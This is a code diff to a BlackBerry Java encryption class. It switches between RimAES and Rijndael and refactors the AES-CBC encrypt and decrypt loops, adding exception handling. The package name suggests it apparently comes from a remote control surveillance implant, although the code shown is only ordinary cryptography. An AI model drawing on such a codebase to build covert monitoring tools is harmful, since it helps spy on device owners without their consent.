@@ -7,6 +7,7 @@
  * *************************************************/
 package com.ht.rcs.blackberry.crypto;
 
+import net.rim.device.api.crypto.CryptoTokenException;
 import net.rim.device.api.crypto.HMAC;
 import net.rim.device.api.crypto.HMACKey;
 import net.rim.device.api.crypto.MACOutputStream;
@@ -98,12 +99,19 @@ public class Encryption {
         return new String(ret_string);
     }
 
-    Rijndael aes;
+    CryptoEngine aes;
 
     boolean keyReady = false;
 
     public Encryption() {
-        aes = new Rijndael();
+
+        if (RimAES.isSupported()) {
+            debug.info("RimAES");
+            aes = new RimAES();
+        } else {
+            debug.info("Rijndael");
+            aes = new Rijndael();
+        }
     }
 
     public byte[] decryptData(byte[] cyphered) {
@@ -126,24 +134,28 @@ public class Encryption {
 
         byte[] pt = new byte[16];
 
-        // int lastTurn = enclen / 16;
+        int numblock = enclen / 16;
+        int lastBlockLen = plainlen % 16;
+        try {
+            for (int i = 0; i < numblock; i++) {
+                byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);
 
-        for (int i = 0; i < enclen / 16; i++) {
-            byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);
+                aes.decrypt(ct, pt);
+                xor(pt, iv);
+                iv = Arrays.copy(ct);
 
-            aes.decrypt(ct, pt);
-            xor(pt, iv);
-            iv = Arrays.copy(ct);
-
-            if ((i + 1 >= enclen / 16) && (plainlen % 16 != 0)) { // last turn
-                // and remaind
-                int lastBlockLen = plainlen % 16;
-                debug.trace("lastBlockLen: " + lastBlockLen);
-                Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
-            } else {
-                Utils.copy(plain, i * 16, pt, 0, 16);
-                // copyblock(plain, i, pt, 0);
+                if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
+                    // and remaind
+                    debug.trace("lastBlockLen: " + lastBlockLen);
+                    Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
+                } else {
+                    Utils.copy(plain, i * 16, pt, 0, 16);
+                    // copyblock(plain, i, pt, 0);
+                }
             }
+        } catch (CryptoTokenException e) {
+            debug.error("error decrypting data");
+            return null;
         }
 
         Check.ensures(plain.length == plainlen, "wrong plainlen");
@@ -168,14 +180,22 @@ public class Encryption {
 
         byte[] ct = new byte[16];
 
-        for (int i = 0; i < clen / 16; i++) {
-            byte[] pt = Arrays.copy(padplain, i * 16, 16);
-            xor(pt, iv);
-            aes.encrypt(pt, ct);
+        int numblock = clen / 16;
+        try {
 
-            Utils.copy(crypted, i * 16, ct, 0, 16);
+            for (int i = 0; i < numblock; i++) {
+                byte[] pt = Arrays.copy(padplain, i * 16, 16);
+                xor(pt, iv);
 
-            iv = Arrays.copy(ct);
+                aes.encrypt(pt, ct);
+
+                Utils.copy(crypted, i * 16, ct, 0, 16);
+
+                iv = Arrays.copy(ct);
+            }
+        } catch (CryptoTokenException e) {
+            debug.error("error crypting data");
+            return null;
         }
 
         return crypted;
@@ -200,6 +220,7 @@ public class Encryption {
 
     /**
      * Calcola il SHA1 del messaggio, usando la crypto api
+     * 
      * @param message
      * @return
      */
